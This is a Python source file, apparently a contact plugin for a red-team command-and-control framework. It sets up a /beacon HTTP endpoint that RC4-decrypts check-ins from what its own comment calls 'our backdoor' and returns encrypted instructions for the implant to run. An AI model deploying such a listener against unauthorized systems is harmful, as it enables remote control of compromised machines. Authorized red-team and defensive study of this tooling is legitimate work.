import json
import logging
import rc4
import base64
from aiohttp import web

from app.utility.base_world import BaseWorld


# This is the listener that listens to connections coming from our backdoor.

class Contact(BaseWorld):

    def __init__(self, services):
        self.name = 'http'
        self.description = 'Accept beacons through a REST API endpoint'
        self.app_svc = services.get('app_svc')
        self.contact_svc = services.get('contact_svc')

    async def start(self):
        """Any POST request coming to /beacon, handle that request through _beacon """
        self.app_svc.application.router.add_route('POST', '/beacon', self._beacon)

    """ PRIVATE """

    async def _beacon(self, request):
        response = await request.read()
        decoded_response = base64.b64decode(response).decode("latin1")
        decrypted_response = rc4.rc4(decoded_response, "RedTeam")
        print("Decrypted Msg: %s\n" % decrypted_response)
        profile = json.loads(decrypted_response)
        profile['paw'] = profile.get('paw')
        profile['contact'] = 'http'
        agent, instructions = await self.contact_svc.handle_heartbeat(**profile)
        response = dict(paw=agent.paw,
                        sleep=await agent.calculate_sleep(),
                        watchdog=agent.watchdog,
                        instructions=json.dumps([json.dumps(i.display) for i in instructions]))
        response_json = json.dumps(response)
        encrypted_msg = rc4.rc4(response_json, "RedTeam")
        encoded_msg = base64.b64encode(bytes(encrypted_msg, "latin1")).decode("latin1")
        return web.Response(text=encoded_msg)
    # except Exception as e:
    #    logging.error('Malformed beacon: %s' % e)
